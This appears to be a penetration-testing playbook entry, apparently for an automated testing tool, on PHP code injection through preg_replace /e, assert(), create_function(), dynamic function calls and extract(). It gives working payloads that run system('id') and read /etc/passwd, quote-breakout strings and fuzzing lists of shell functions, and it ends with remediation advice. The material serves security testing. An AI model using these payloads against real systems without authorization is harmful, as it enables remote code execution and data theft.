# Code injection: preg_replace /e, assert(), dynamic calls (PHP)

Beyond `eval()`, several PHP built-ins execute attacker strings as PHP code
outright. All require PHP <8 except `call_user_func()`, which is evergreen.
Confirm PHP version first (10-fingerprint).

1. **`preg_replace()` with the `/e` modifier** (removed PHP 7.0): if a
   search/replace feature builds `preg_replace($pattern, $_GET['x'], $subject)`
   with a HARD-CODED `/e` flag, `$_GET['x']` is eval'd as PHP. Payload:
   `x=system('id')` or `x=phpinfo()`. Confirm via `http_request`, read the
   command output in the body.
2. **`assert()` string evaluation** (removed PHP 8): `assert("strpos('$file',
   '..')===false")`-style checks eval the whole string. Break out of the
   quoted context: `file=x') or system('id') or ('1`. Sweep quote/paren
   breakouts with `http_fuzz`, `match_regex:"uid=\\d+\\("`.
3. **`create_function()`** (removed PHP 8) builds `function($a){ body }` from
   a string — close the function body early and append code:
   `x=0){} system('id');//`.
4. **Dynamic/variable function calls**: `call_user_func($_GET['func'],
   $_GET['arg'])`, `$_GET['func']($_GET['arg'])`, or an array-based callable
   let you name ANY built-in. Try `func=system&arg=id`,
   `func=passthru&arg=id`, `func=file_get_contents&arg=/etc/passwd`. Sweep
   names in one `http_fuzz` (marker on `func`, `payloads:["system","exec",
   "shell_exec","passthru","assert"]`, `match_regex:"uid=\\d+\\("`).
5. **`extract()`/`parse_str()` scope pollution**: same effect as
   register_globals (see `00-notes.md`) — if the app calls `extract($_GET)` or
   `parse_str($qs, $x)` without a prefix/array target, any internal variable
   name is a candidate query param.

Evidence: command output (`id`, `/etc/passwd`) or `phpinfo()` banner in the
response body.
Remediation: never build eval/preg_replace `/e`/assert/create_function from
input; allowlist callable names before `call_user_func`; drop `extract()` on
superglobals or pass `EXTR_SKIP`.
